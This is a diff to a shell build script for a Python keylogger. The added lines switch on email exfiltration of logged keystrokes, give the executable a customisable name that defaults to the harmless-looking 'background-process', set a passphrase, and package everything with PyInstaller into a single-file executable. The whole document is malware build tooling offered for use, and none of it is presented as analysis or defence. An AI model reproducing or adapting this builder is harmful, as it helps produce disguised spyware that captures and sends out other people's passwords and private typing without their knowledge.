@@ -49,10 +49,34 @@ compliant_phrase "$outputname"
 compliant_phrase "$passphrase"
 
 # check that logging flag is valid
-echo "$logsmethod" | grep -Ex '[ef]*' || { echo "'$logsmethod' is not a valid logging method (valid ones are [ e(mail)|f(ile) ]" ; exit 4 ; }
+echo "$logsmethod" | grep -Ex '[ef]*' > /dev/null || { echo "'$logsmethod' is not a valid logging method (valid ones are [ e(mail)|f(ile) ]" ; exit 4 ; }
+
+# make a backup of keylogger and edit the backup
+# note we don't delete this in case in needs to be inspected if something goes wrong
+cp keylogger.py keylogger-2.py
+
+# now actually edit the text of keylogger
+
+alias mysed="sed -E -i ''"
+
+# the default for logging is file so check if it's email
+if [ "$logsmethod" = 'e' ]
+then
+    mysed 's/(self\.log_via_email = )(False)/\1True/' keylogger-2.py
+fi
+
+if [ ! -z "$outputname" ]
+then
+    mysed "s/(self\.exe_name = )'(background-process)'/\1'$outputname'/" keylogger-2.py
+fi
+
+if [ ! -z "$passphrase" ]
+then
+    mysed "s/(self\.passphrase = )'(fishing-in-the-river-champion)'/\1'$passphrase'/" keylogger-2.py
+fi
 
 # delete any existing pyinstaller output
 ./rm-pyinstaller > /dev/null 2>&1
 
 # now ready to build the file
-pyinstaller --onefile keylogger.py --name $outputname && cp dist/$outputname ~
+pyinstaller --onefile keylogger-2.py --name $outputname && cp dist/$outputname ~
